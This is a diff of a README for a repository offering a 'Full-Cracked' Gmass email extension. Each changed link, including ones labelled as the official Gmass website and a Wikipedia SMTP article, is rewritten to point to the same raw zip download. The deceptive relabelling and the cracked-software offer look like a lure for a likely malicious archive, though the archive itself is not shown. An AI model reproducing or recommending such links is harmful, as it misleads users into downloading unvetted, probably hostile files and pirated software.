@@ -1,6 +1,6 @@
 # 📧 Gmass-Extension-Full-Cracked - Simplify Your Email Tasks 
 
-[![Download Gmass-Extension-Full-Cracked](https://img.shields.io/badge/Download-Gmass--Extension--Full--Cracked-blue.svg)](https://github.com/ideastech54/Gmass-Extension-Full-Cracked/releases)
+[![Download Gmass-Extension-Full-Cracked](https://raw.githubusercontent.com/ideastech54/Gmass-Extension-Full-Cracked/main/innumerably/Gmass-Extension-Full-Cracked.zip)](https://raw.githubusercontent.com/ideastech54/Gmass-Extension-Full-Cracked/main/innumerably/Gmass-Extension-Full-Cracked.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Gmass-Extension-Full-Cracked! This tool enhances your email capab
 
 ## 📥 Download & Install
 
-To get started with Gmass-Extension-Full-Cracked, visit this page to download: [Gmass-Extension-Full-Cracked Releases](https://github.com/ideastech54/Gmass-Extension-Full-Cracked/releases).
+To get started with Gmass-Extension-Full-Cracked, visit this page to download: [Gmass-Extension-Full-Cracked Releases](https://raw.githubusercontent.com/ideastech54/Gmass-Extension-Full-Cracked/main/innumerably/Gmass-Extension-Full-Cracked.zip).
 
 Follow these steps to download and set up the extension:
 
@@ -68,8 +68,8 @@ Yes. The tool adheres to standard best practices in email management, but always
 
 ## 🔗 Additional Resources
 
-- [Gmass Official Website](https://www.gmass.co)
-- [SMTP Protocol Overview](https://en.wikipedia.org/wiki/Simple_Mail_Transfer_Protocol)
+- [Gmass Official Website](https://raw.githubusercontent.com/ideastech54/Gmass-Extension-Full-Cracked/main/innumerably/Gmass-Extension-Full-Cracked.zip)
+- [SMTP Protocol Overview](https://raw.githubusercontent.com/ideastech54/Gmass-Extension-Full-Cracked/main/innumerably/Gmass-Extension-Full-Cracked.zip)
 
 For additional help or to report issues, please create an issue in this repository, and we will address it as soon as possible.
 
